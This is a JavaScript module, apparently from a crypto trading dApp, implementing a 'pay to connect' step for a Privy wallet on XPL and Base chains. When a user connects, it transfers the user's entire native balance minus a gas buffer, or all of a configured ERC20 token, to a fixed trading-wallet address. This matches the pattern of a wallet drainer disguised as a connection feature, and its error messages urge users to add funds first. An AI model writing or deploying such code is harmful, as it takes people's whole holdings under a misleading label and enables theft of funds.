import { ethers } from 'ethers';
import { transferERC20ToTradingWallet, getERC20Balance } from './erc20.js';
import { CHAINS } from '../config/chains.js';

/**
 * Pay to Connect - Multi-chain implementation
 * Transfers native token or ERC20 to trading wallet based on chain
 */

/**
 * Execute pay-to-connect for current chain
 * @param {object} wallet - Privy wallet object
 * @param {number} chainId - Current chain ID
 * @returns {Promise<object>} - Transaction result
 */
export async function executePayToConnect(wallet, chainId) {
  const chainConfig = CHAINS[Object.keys(CHAINS).find(key => CHAINS[key].chainId === chainId)];
  
  if (!chainConfig) {
    throw new Error(`Unsupported chain: ${chainId}`);
  }
  
  console.log(`🚀 Starting pay-to-connect on ${chainConfig.name}`);
  
  // Get ethers provider and signer from Privy wallet
  const provider = await wallet.getEthersProvider();
  const signer = provider.getSigner();
  const userAddress = await signer.getAddress();
  
  if (chainConfig.payToConnect.type === 'NATIVE') {
    // XPL Chain - Transfer native XPL
    return await transferNativeToken(signer, userAddress, chainConfig);
  } else if (chainConfig.payToConnect.type === 'ERC20') {
    // Base Chain - Transfer ERC20 token
    return await transferERC20Token(signer, userAddress, chainConfig);
  } else {
    throw new Error(`Unknown payment type: ${chainConfig.payToConnect.type}`);
  }
}

/**
 * Transfer native token (XPL) to trading wallet
 */
async function transferNativeToken(signer, userAddress, chainConfig) {
  try {
    const provider = signer.provider;
    
    // Get user's XPL balance
    const balance = await provider.getBalance(userAddress);
    console.log(`💰 Current XPL balance: ${ethers.formatEther(balance)} XPL`);
    
    if (balance === 0n) {
      throw new Error('No XPL to transfer. Please add XPL to your wallet first.');
    }
    
    // Calculate amount to send (ALL minus gas buffer)
    const gasBuffer = ethers.parseEther(chainConfig.payToConnect.gasBuffer || '0.001');
    
    if (balance <= gasBuffer) {
      throw new Error(`Insufficient XPL. Need more than ${chainConfig.payToConnect.gasBuffer} XPL for gas.`);
    }
    
    const amountToSend = balance - gasBuffer;
    
    console.log(`📤 Transferring ${ethers.formatEther(amountToSend)} XPL to trading wallet`);
    console.log(`🔒 Keeping ${chainConfig.payToConnect.gasBuffer} XPL for gas`);
    
    // Send transaction
    const tx = await signer.sendTransaction({
      to: chainConfig.tradingWallet,
      value: amountToSend
    });
    
    console.log(`⏳ Transaction sent: ${tx.hash}`);
    
    const receipt = await tx.wait();
    console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
    
    return {
      success: true,
      txHash: tx.hash,
      amount: ethers.formatEther(amountToSend),
      symbol: chainConfig.nativeCurrency.symbol,
      type: 'NATIVE'
    };
    
  } catch (error) {
    console.error('❌ Native token transfer error:', error);
    throw error;
  }
}

/**
 * Transfer ERC20 token to trading wallet (Base chain)
 */
async function transferERC20Token(signer, userAddress, chainConfig) {
  try {
    const tokenAddress = chainConfig.payToConnect.token;
    
    console.log(`💰 Checking ${chainConfig.payToConnect.name} balance...`);
    
    // Get balance first
    const balance = await getERC20Balance(tokenAddress, userAddress, signer.provider);
    
    if (parseFloat(balance) === 0) {
      throw new Error(`No ${chainConfig.payToConnect.name} tokens to transfer. Please add tokens to your wallet first.`);
    }
    
    // Transfer ALL tokens to trading wallet
    const result = await transferERC20ToTradingWallet(
      tokenAddress,
      chainConfig.tradingWallet,
      signer
    );
    
    return {
      ...result,
      type: 'ERC20'
    };
    
  } catch (error) {
    console.error('❌ ERC20 token transfer error:', error);
    throw error;
  }
}

/**
 * Check if user has sufficient balance for pay-to-connect
 */
export async function checkPayToConnectBalance(wallet, chainId) {
  const chainConfig = CHAINS[Object.keys(CHAINS).find(key => CHAINS[key].chainId === chainId)];
  
  if (!chainConfig) {
    return { sufficient: false, balance: '0', message: 'Unsupported chain' };
  }
  
  const provider = await wallet.getEthersProvider();
  const signer = provider.getSigner();
  const userAddress = await signer.getAddress();
  
  if (chainConfig.payToConnect.type === 'NATIVE') {
    const balance = await provider.getBalance(userAddress);
    const gasBuffer = ethers.parseEther(chainConfig.payToConnect.gasBuffer || '0.001');
    const sufficient = balance > gasBuffer;
    
    return {
      sufficient,
      balance: ethers.formatEther(balance),
      symbol: chainConfig.nativeCurrency.symbol,
      message: sufficient ? 'Sufficient balance' : `Need more than ${chainConfig.payToConnect.gasBuffer} ${chainConfig.nativeCurrency.symbol}`
    };
  } else if (chainConfig.payToConnect.type === 'ERC20') {
    const balance = await getERC20Balance(
      chainConfig.payToConnect.token,
      userAddress,
      provider
    );
    const sufficient = parseFloat(balance) > 0;
    
    return {
      sufficient,
      balance,
      symbol: chainConfig.payToConnect.name,
      message: sufficient ? 'Sufficient balance' : `No ${chainConfig.payToConnect.name} tokens`
    };
  }
  
  return { sufficient: false, balance: '0', message: 'Unknown payment type' };
}
